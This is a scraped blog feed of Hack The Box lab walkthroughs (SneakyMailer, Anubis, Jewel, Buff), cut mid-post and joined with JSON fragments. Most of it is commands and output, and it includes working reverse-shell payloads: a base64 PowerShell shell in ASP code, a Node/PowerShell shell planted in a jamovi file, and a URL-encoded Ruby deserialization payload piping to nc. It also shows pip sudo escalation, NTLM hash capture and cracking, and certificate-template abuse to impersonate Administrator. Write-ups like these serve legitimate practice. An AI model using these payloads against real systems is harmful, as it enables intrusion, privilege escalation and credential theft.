‚Äò10.10.17.16:8080/pypi-pkg/.pypirc‚Äô10.10.14.24:8080/py 100%[===================&amp;gt;] 128 --.-KB/s in 0s 2020-07-16 01:06:26 (10.6 MB/s) - ‚Äò10.10.17.16:8080/pypi-pkg/.pypirc‚Äô saved [128/128]--2020-07-16 01:06:28-- http://10.10.17.16:8080/pypi-pkg/setup.pyConnecting to 10.10.17.16:8080... connected.HTTP request sent, awaiting response... 200 OKLength: 480 [text/plain]Saving to: ‚Äò10.10.14.24:8080/pypi-pkg/setup.py‚Äô10.10.14.24:8080/py 100%[===================&amp;gt;] 480 --.-KB/s in 0s 2020-07-16 01:06:29 (45.9 MB/s) - ‚Äò10.10.17.16:8080/pypi-pkg/setup.py‚Äô saved [480/480] developer@sneakymailer:/tmp/10.10.14.24:8080$ lslspypi-pkgdeveloper@sneakymailer:/tmp/10.10.14.24:8080/pypi-pkg$ ls -als -a. .. .pypirc setup.py Executing the package Setting the path to current dirdeveloper@sneakymailer:/tmp/10.10.17.16:8080/pypi-pkg$ HOME=`pwd` Running setup.pydeveloper@sneakymailer:~$ python3 setup.py sdist register -r local upload -r local&amp;lt;n3 setup.py sdist register -r local upload -r localrunning sdistrunning egg_infocreating sample.egg-infowriting sample.egg-info/PKG-INFOwriting dependency_links to sample.egg-info/dependency_links.txtwriting requirements to sample.egg-info/requires.txtwriting top-level names to sample.egg-info/top_level.txtwriting manifest file &#39;sample.egg-info/SOURCES.txt&#39;reading manifest file &#39;sample.egg-info/SOURCES.txt&#39;writing manifest file &#39;sample.egg-info/SOURCES.txt&#39;warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.mdrunning checkcreating sample-1.2.0creating sample-1.2.0/sample.egg-infocopying files to sample-1.2.0...copying setup.py -&amp;gt; sample-1.2.0copying sample.egg-info/PKG-INFO -&amp;gt; sample-1.2.0/sample.egg-infocopying sample.egg-info/SOURCES.txt -&amp;gt; sample-1.2.0/sample.egg-infocopying sample.egg-info/dependency_links.txt -&amp;gt; sample-1.2.0/sample.egg-infocopying sample.egg-info/requires.txt -&amp;gt; sample-1.2.0/sample.egg-infocopying sample.egg-info/top_level.txt -&amp;gt; sample-1.2.0/sample.egg-infoWriting sample-1.2.0/setup.cfgcreating distCreating tar archiveremoving &#39;sample-1.2.0&#39; (and everything under it)running registerRegistering sample to http://pypi.sneakycorp.htb:8080Server response (200): OKWARNING: Registering is deprecated, use twine to upload instead (https://pypi.org/p/twine/)running uploadSubmitting dist/sample-1.2.0.tar.gz to http://pypi.sneakycorp.htb:8080Server response (200): OKWARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/) User flag!. ‚ûú sneakymailer rlwrap nc -nlvp 2345 Ncat: Version 7.80 ( https://nmap.org/ncat )Ncat: Listening on :::2345Ncat: Listening on 0.0.0.0:2345Ncat: Connection from 10.10.10.197.Ncat: Connection from 10.10.10.197:45674.python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;low@sneakymailer:/$ whoamiwhoamilow low@sneakymailer:~$ cat user.txtcat user.txta5b----------------------------a9Root flag!.Privilege escalation low@sneakymailer:~$ sudo -lsudo: unable to resolve host sneakymailer: Temporary failure in name resolutionMatching Defaults entries for low on sneakymailer: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser low may run the following commands on sneakymailer: (root) NOPASSWD: /usr/bin/pip3 Go tohttps://gtfobins.github.io/gtfobins/pip/and search for pip TF=$(mktemp -d)echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&#39;)&quot; &amp;gt; $TF/setup.pypip install $TFlow@sneakymailer:~$ TF=$(mktemp -d)low@sneakymailer:~$ echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&#39;)&quot; &amp;gt; $TF/setup.pylow@sneakymailer:~$ sudo pip3 install $TFlow@sneakymailer:~$ sudo pip3 install $TFsudo: unable to resolve host sneakymailer: Temporary failure in name resolutionProcessing /tmp/tmp.tQid5dJuNf# bashroot@sneakymailer:/tmp/pip-req-build-9k8kjhct# whoamirootAnd we are &quot;ROOT&quot;!. root@sneakymailer:~# cat root.txt11----------------------------ffroot@sneakymailer:~# Thanks for Reading üôè" }, { "title": "Hackthebox Anubis walkthrough", "url": "/posts/Hackthebox-Anubis-Walkthrough/", "categories": "HTB", "tags": "HTB", "date": "2021-11-26 01:29:00 +0000", "snippet": "Summary RCE in the Web application Pivoting Network analysis Custom Exploitation Domain Admin by Abusing Certifcate serviceScanningnmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open10.10.11.102Nmap scan report for 10.10.11.102Host is up (0.16s latency).Not shown: 65530 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| tls-alpn:|_ http/1.1|_http-title: Not Found| ssl-cert: Subject: commonName=www.windcorp.htb| Subject Alternative Name: DNS:www.windcorp.htb| Issuer: commonName=www.windcorp.htb| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-05-24T19:44:56| Not valid after: 2031-05-24T19:54:56| MD5: e2e7 86ef 4095 9908 14c5 3347 cdcb 4167|_SHA-1: 7fce 781f 883c a27e 1154 4502 1686 ee65 7551 0e2a|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: 2021-10-30T12:43:00+00:00; -1s from scanner time.445/tcp open microsoft-ds?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049710/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2021-10-30T12:42:24|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled and requiredNmap scan showed 5 opened ports, 1st lets add windcrop.htb to /etc/hosts and check the web application.The application is static, there is only from that looks interesting.I will use burpsuite to analyze the request.User input goes to save.asp file, Can we get a remote code execution ?.Lets check !I injected the message parameter with .net code to ping me, Now i will start tcpdump to listen to ICMP. ‚îî‚îÄ$ sudo tcpdump -i tun0 icmp[sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes PINGO !The code worked and i received the ICMP requests. ‚îî‚îÄ$ sudo tcpdump -i tun0 icmp[sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes13:04:02.641660 IP www.windcorp.htb &amp;gt; 10.10.17.76: ICMP echo request, id 1000, seq 2765, length 4013:04:02.641680 IP 10.10.17.76 &amp;gt; www.windcorp.htb: ICMP echo reply, id 1000, seq 2765, length 4013:04:03.396917 IP www.windcorp.htb &amp;gt; 10.10.17.76: ICMP echo request, id 1000, seq 2766, length 4013:04:03.396932 IP 10.10.17.76 &amp;gt; www.windcorp.htb: ICMP echo reply, id 1000, seq 2766, length 4013:04:04.402129 IP www.windcorp.htb &amp;gt; 10.10.17.76: ICMP echo request, id 1000, seq 2767, length 4013:04:04.402147 IP 10.10.17.76 &amp;gt; www.windcorp.htb: ICMP echo reply, id 1000, seq 2767, length 4013:04:05.403973 IP www.windcorp.htb &amp;gt; 10.10.17.76: ICMP echo request, id 1000, seq 2768, length 4013:04:05.403998 IP 10.10.17.76 &amp;gt; www.windcorp.htb: ICMP echo reply, id 1000, seq 2768, length 40 FootholdLets get a reverse shell !I generated the reverse shell using revshellsPAYLOAD &amp;lt;% Set m19o = CreateObject(&quot;WScript.Shell&quot;) Set cmd = m19o.Exec(&quot;cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4ANwA2ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;) o = cmd.StdOut.Readall() Response.write(o) %&amp;gt; I need now to listen on port 1337 using netcat. ‚îî‚îÄ# nc -nlvp 1337listening on [any] 1337 ...Now i got a reverseshell. ‚îî‚îÄ# nc -nlvp 1337listening on [any] 1337 ...connect to [10.10.17.76] from (UNKNOWN) [10.10.11.102] 49886C:\\windows\\system32\\inetsrv&amp;gt; whoamint authority\\system Huh?, system ! I don‚Äôt think it‚Äôs easy like thatPS C:\\Users&amp;gt; ls Directory: C:\\UsersMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 4/9/2021 10:36 PM Administrator d----- 5/25/2021 12:05 PM ContainerAdministrator d----- 4/9/2021 10:37 PM ContainerUser d-r--- 4/9/2021 10:36 PM Public It‚Äôs a container.### EnumerationLets see what the Administrator have on desktop. PS C:\\Users\\Administrator\\Desktop&amp;gt; ls Directory: C:\\Users\\Administrator\\DesktopMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 5/24/2021 9:36 PM 989 req.txt PS C:\\Users\\Administrator\\Desktop&amp;gt; type req.txt-----BEGIN CERTIFICATE REQUEST-----MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5kY29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHCKsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKbBEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntLeEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnzQMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOqqmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+HJzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2PWW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOtyKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1FF09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso4TlwpQ==-----END CERTIFICATE REQUEST-----It‚Äôs SSL certifacte, lets decode it.‚îî‚îÄ$ openssl req -in cert.txt -text -noout 1 ‚®ØCertificate Request: Data: Version: 1 (0x0) Subject: C = AU, ST = Some-State, O = WindCorp, CN = softwareportal.windcorp.htbThere is another subdomain, I added it to /etc/hosts but i couldn‚Äôt reach itI need to establish a tunnel to port forward the machines ports to see be able to open the internal web application.Port forwardingIf you are struggling downloading chisel to the machine you can use this command : ‚Äú(new-object System.Net.WebClient).DownloadFile(‚Äòhttp://10.10.17.76:8888/chisel.exe‚Äô,‚ÄôC:\\users\\Administrator\\Desktop\\chisel.exe‚Äô)‚Äù.Victim MachinePS C:\\users\\Administrator\\Desktop&amp;gt; .\\chis.exe client 10.10.17.76:1337 R:127.0.0.1:socks Attacker Machine‚îî‚îÄ$ chisel server -p 1337 --reverse2022/01/28 14:32:40 server: Reverse tunnelling enabled2022/01/28 14:32:40 server: Fingerprint YKQAlu2lx0JtzcE9jJtYMrNMEmuDWR7cBzob7ZP6IIA=2022/01/28 14:32:40 server: Listening on http://0.0.0.0:13372022/01/28 14:33:14 server: session#1: Client version (1.7.3) differs from server version (0.0.0-src)2022/01/28 14:33:14 server: session#1: tun: proxy#R:127.0.0.1:1080=&amp;gt;socks: ListeningNow we need too add softwareportal.windcorp.htb to our /etc/hosts and setup the socks as our proxy in the browser.172.25.144.1 softwareportal.windcorp.htbthat&#39;s the container default gatewayThe web application is getting the programs from internal ip, lets see what is happening.Lateral MovementLets analyze the request by changing the client to our ip and setup a listener using TCPDUMP to see what is happening.Victim MachinePS C:\\windows\\system32\\inetsrv&amp;gt; curl &quot;http://softwareportal.windcorp.htb/install.asp?client=10.10.17.76&amp;amp;software=gimp-2.10.24-setup-3.exe&quot;Attacker Machine‚îî‚îÄ$ sudo tcpdump -i tun0 -w logs.pcap -n tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytesLets grep the logs and start the analysis.tcpdump -r logs.pcap | grep -v &#39;5554&#39; | head reading from file logs.pcap, link-type RAW (Raw IP), snapshot length 262144 20:47:56.626363 IP 10.10.11.102.50856 &amp;gt; 10.10.17.76.5985: Flags [SEW], seq 4024374084, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:56.626424 IP 10.10.17.76.5985 &amp;gt; 10.10.11.102.50856: Flags [R.], seq 0, ack 4024374085, win 0, length 0 20:47:57.373410 IP 10.10.11.102.50856 &amp;gt; 10.10.17.76.5985: Flags [S], seq 4024374084, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:57.373457 IP 10.10.17.76.5985 &amp;gt; 10.10.11.102.50856: Flags [R.], seq 0, ack 1, win 0, length 0 20:47:58.089647 IP 10.10.11.102.50856 &amp;gt; 10.10.17.76.5985: Flags [S], seq 4024374084, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:58.089682 IP 10.10.17.76.5985 &amp;gt; 10.10.11.102.50856: Flags [R.], seq 0, ack 1, win 0, length 0 20:47:58.249260 IP 10.10.11.102.50857 &amp;gt; 10.10.17.76.5985: Flags [SEW], seq 2900609790, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:58.249305 IP 10.10.14.79.5985 &amp;gt; 10.10.11.102.50857: Flags [R.], seq 0, ack 2900609791, win 0, length 0 20:47:59.012439 IP 10.10.11.102.50857 &amp;gt; 10.10.17.76.5985: Flags [S], seq 2900609790, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:59.012486 IP 10.10.17.76.5985 &amp;gt; 10.10.11.102.50857: Flags [R.], seq 0, ack 1, win 0, length 0That didn‚Äôt work for me from the 1st time, don‚Äôt give up on it, keep trying.From that logs i understood that the web application trying to authenticate from WinRM to get the file.Escaping the dockerI will start the respinder to catch the hash of the user that trying to authenticate against WinRM.sudo responder -I tun0 -vLets repeat the request and see what will happen.PS C:\\windows\\system32\\inetsrv&amp;gt; curl &quot;http://softwareportal.windcorp.htb/install.asp?client=10.10.17.76&amp;amp;software=gimp-2.10.24-setup-3.exe&quot;BAM ![+] Listening for events... [WinRM] NTLMv2 Client : 10.10.11.102 [WinRM] NTLMv2 Username : windcorp\\localadmin [WinRM] NTLMv2 Hash : localadmin::windcorp:5154b10fe742e26f:02D37AB30D2443EEFC13F18062985D6E:0101000000000000B574CFFAD2CDD7012A9D75CCC99D4C0D0000000002000800490053003700540001001E00570049004E002D00520031005800530059005400560035003700450034000400140049005300370054002E004C004F00430041004C0003003400570049004E002D00520031005800530059005400560035003700450034002E0049005300370054002E004C004F00430041004C000500140049005300370054002E004C004F00430041004C0008003000300000000000000000000000002100008840E4FBD0AA6E1880E61526E42DF0210E6BE2F694B85FED945A976C305BDE030A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00370039000000000000000000Lets crack it.hashcat -m 5600 hash_localadmin /usr/share/wordlists/rockyou.txthashcat (v6.1.1) starting...------------SNIP------------LOCALADMIN::windcorp:5154b10fe742e26f:02d37ab30d2443eefc13f18062985d6e:0101000000000000b574cffad2cdd7012a9d75ccc99d4c0d0000000002000800490053003700540001001e00570049004e002d00520031005800530059005400560035003700450034000400140049005300370054002e004c004f00430041004c0003003400570049004e002d00520031005800530059005400560035003700450034002e0049005300370054002e004c004f00430041004c000500140049005300370054002e004c004f00430041004c0008003000300000000000000000000000002100008840e4fbd0aa6e1880e61526e42df0210e6be2f694b85fed945a976c305bde030a001000000000000000000000000000000000000900200048005400540050002f00310030002e00310030002e00310034002e00370039000000000000000000:Secret123Session..........: hashcatStatus...........: CrackedHash.Name........: NetNTLMv2Hash.Target......: LOCALADMIN::windcorp:5154b10fe742e26f:02d37ab30d244...000000Time.Started.....: Sat Oct 30 21:17:32 2021 (3 secs)Time.Estimated...: Sat Oct 30 21:17:35 2021 (0 secs)Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 713.3 kH/s (2.36ms) @ Accel:1024 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) DigestsProgress.........: 2093056/14344385 (14.59%)Rejected.........: 0/2093056 (0.00%)Restore.Point....: 2091008/14344385 (14.58%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: Smudge4 -&amp;gt; SaTeLlItEStarted: Sat Oct 30 21:17:30 2021Stopped: Sat Oct 30 21:17:37 2021------------SNIP------------UserLets enumerate SMB.smbclient -L //10.10.11.102 -U localadminEnter WORKGROUP\\localadmin&#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share CertEnroll Disk Active Directory Certificate Services share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shared Disk SYSVOL Disk Logon server share&amp;gt; smbclient //10.10.11.102/Shared -U localadminEnter WORKGROUP\\localadmin&#39;s password:Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; ls. D 0 Wed Apr 28 15:06:06 2021.. D 0 Wed Apr 28 15:06:06 2021Documents D 0 Tue Apr 27 04:09:25 2021Software D 0 Thu Jul 22 18:14:16 2021 9034239 blocks of size 4096. 3206077 blocks availablesmb: \\&amp;gt; ls Software\\ . D 0 Thu Jul 22 18:14:16 2021 .. D 0 Thu Jul 22 18:14:16 2021 7z1900-x64.exe N 1447178 Mon Apr 26 21:10:08 2021 jamovi-1.6.16.0-win64.exe N 247215343 Mon Apr 26 21:03:30 2021 VNC-Viewer-6.20.529-Windows.exe N 10559784 Mon Apr 26 21:09:53 2021 9034239 blocks of size 4096. 3206077 blocks availablesmb: \\&amp;gt; ls Documents\\Analytics\\ . D 0 Tue Apr 27 18:40:20 2021 .. D 0 Tue Apr 27 18:40:20 2021 Big 5.omv A 6455 Tue Apr 27 18:39:20 2021 Bugs.omv A 2897 Tue Apr 27 18:39:55 2021 Tooth Growth.omv A 2142 Tue Apr 27 18:40:20 2021 Whatif.omv A 2841 Sat Oct 30 21:49:42 2021 9034239 blocks of size 4096. 3206077 blocks availableWhat is .omv, Lets search.I searched for jamovi latest vulnerabilities and i found this CVE-2021-28079I need to make .OMV file and inject XSS payload to get a reverse shell.note : Don‚Äôt exhaust yourself trying to find that vuln version download it from the share.Lets unzip Whatif.omv. ‚îî‚îÄ# unzip Whatif.omv Archive: Whatif.omv inflating: META-INF/MANIFEST.MF inflating: index.html inflating: metadata.json inflating: xdata.json inflating: data.bin inflating: 01 empty/analysis I injected the name column as described in the previous link.(() =&amp;gt; { let sh = require(&#39;child_process&#39;); sh.exec(&quot;powershell -nop -c \\&quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.17.76&#39;,4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&amp;gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\&quot;&quot;); return /a/;})();That is the reverse shell i used make sure you save it as .js file, Now replace the file we made with the one on the server using SMB.smb: \\Documents\\Analytics\\&amp;gt; smb: \\Documents\\Analytics\\&amp;gt; put Whatif.omvputting file Whatif.omv as \\Documents\\Analytics\\Whatif.omv (2.0 kb/s) (average 2.0 kb/s)start you Http server to deliver the file and use netcat to get the reverseshell.PS C:\\users\\diegocruz&amp;gt; cd DesktopPS C:\\users\\diegocruz\\Desktop&amp;gt; type user.txt8a298cdf7dc52a52a607b9f3912966ffROOTIf you noticed CertEnroll share when we used SMBclient, that folder used by Active Directory Certificate Services for certificate enrollment.now lets use certutil -template to see what template we have permission to issue. PS&amp;gt; certutil -template Template[31]: TemplatePropCommonName = Web TemplatePropFriendlyName = Web TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-3510634497-171945951-3071966075-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3510634497-171945951-3071966075-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3510634497-171945951-3071966075-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;LA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3510634497-171945951-3071966075-3290)(A;;LCRPLORC;;;AU) Allow Enroll WINDCORP\\Domain Admins Allow Enroll WINDCORP\\Enterprise Admins Allow Full Control WINDCORP\\Domain Admins Allow Full Control WINDCORP\\Enterprise Admins Allow Full Control WINDCORP\\Administrator Allow Full Control WINDCORP\\webdevelopers Allow Read NT AUTHORITY\\Authenticated UsersUSER INFORMATION----------------User Name SID ================== =============================================windcorp\\diegocruz S-1-5-21-3510634497-171945951-3071966075-3245GROUP INFORMATION-----------------Group Name Type SID Attributes ========================================== ================ ============================================= ==================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Group used for deny only NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled groupWINDCORP\\webdevelopers Group S-1-5-21-3510634497-171945951-3071966075-3290 Mandatory group, Enabled by default, Enabled groupThe user we have is a membar of webdevelopers group, So we can issue the certificate using WEB template.After some searching i found a detailed article for this attack Certified-Pre-OwnedWe need to get Certify.exe to start out attack, You can find it here CompiledBinairesPS C:\\Users\\diegocruz\\Desktop&amp;gt; .\\certify.exe request /ca:earth.windcorp.htb\\windcorp-CA /template:Web /altname:Administrator _____ _ _ __ / ____| | | (_)/ _| | | ___ _ __| |_ _| |_ _ _ | | / _ \\ &#39;__| __| | _| | | | | |___| __/ | | |_| | | | |_| | \\_____\\___|_| \\__|_|_| \\__, | __/ | |___./ v1.0.0 [*] Action: Request a Certificates[*] Current user context : WINDCORP\\diegocruz[*] No subject name specified, using current context as subject.[*] Template : Web[*] Subject : CN=Diego Cruz, OU=MainOffice, DC=windcorp, DC=htb[*] AltName : Administrator[*] Certificate Authority : earth.windcorp.htb\\windcorp-CA[*] CA Response : The certificate had been issued.[*] Request ID : 3[*] cert.pem :Now copy the certificate from the victim machine and paste it to a file called cert.pem in your machine, Now convert it using openssl.‚îî‚îÄ# openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfxEnter Export Password:Verifying - Enter Export Password:‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/kali/HTB/anubis]‚îî‚îÄ# ls cert.pem cert.pfx Lets get our TGT.Export it to KRB :DONE" }, { "title": "Hackthebox jewel walkthrough", "url": "/posts/Hack-the-box-jewel-walkthrough/", "categories": "HTB", "tags": "HTB", "date": "2021-11-26 01:29:00 +0000", "snippet": "ScanningWe found port 22 for ssh and port 8000,8080 for HTTP where port 8000Let`s add jewel.htb in our hosts EnumerationPort 8000port 8080Let`s enumerate the BLOG!We found 2 user Bill,Jennifer Let`s enumerate the REPO After some enumerating i found SQL file &quot;bd.sql&quot; and i got some hashesI cracked Bill hash &quot;spongebob&quot; but couldn`t login, let`s countinue enumerationUser flagIt`s using ruby &#39;2.5.5&#39; , let`s search for an exploitAfter searching i found a CVECVE-2020-8165I tested all the fields and i found that the vulnerable input in updating user fieldsPayload %04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22U%60rm+%2Ftmp%2Ff%3Bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.XX.XX+9001+%3e%2Ftmp%2ff%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09TChange the ip to your ip$ su billPassword: bill@jewel:~$ whoamibillThe password is &quot;spongebob&quot; we cracked it if you remember Let`s upgrade our shell Root flagI listed the directory as 1st step of enumeration and i found Google auth, it look like the admin use 2FALet`s get the secret key and use google authLet`s generate the OTPLet`s use the OTPLooks like something wrong.This step made my mind blow off , i searched a lot and asked for a nudge at HTB discord serverSomeone told me it`s about sync with the victim box, let`s see.Timezone is different, let`s set our machine to the victim timezoneLet`s try to escalate privilege againBam ! it`s workingsudo gem open -e &quot;/bin/sh -c /bin/sh&quot; rdoc Thanks for reading i hope you enjoyed " }, { "title": "Hackthebox Buff walkthrough", "url": "/posts/Hackthebox-Buff-Walkthrough/", "categories": "HTB", "tags": "HTB", "date": "2021-11-26 01:27:00 +0000", "snippet": "EnumerationŸêLet`s begain scanning with NMAPŸêTwo ports are open 8080 , 7680ŸêAfter opening the webapp at 8080 i found out it`s from ProjectWorld.inAnd i searched for the projecthttps://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/ I searched for public exploit for the project and i found this ExploitExploitingPython scriptŸêWe got in !ŸêLet`s upload nc.exeLet`s get our reverse shell ŸêC:\\xampp\\htdocs\\gym\\upload&amp;gt; powershell -c &quot;.\\nc.exe 10.10.10.10 1234 -e powershell&quot;ŸêWe got shell as SHAUN ! , Let`s get the user hash.USER Flag !Privilege EscalationI uploaded WinPEAS.exe and after i ran it i found a vulnerable app called Cloudme.exe,it`s running on 8888 port I search for an exploit and found theseŸêWe need to use portforwarding to run the exploit, you can use CHISEL or PLINK.It should be compiled to exe 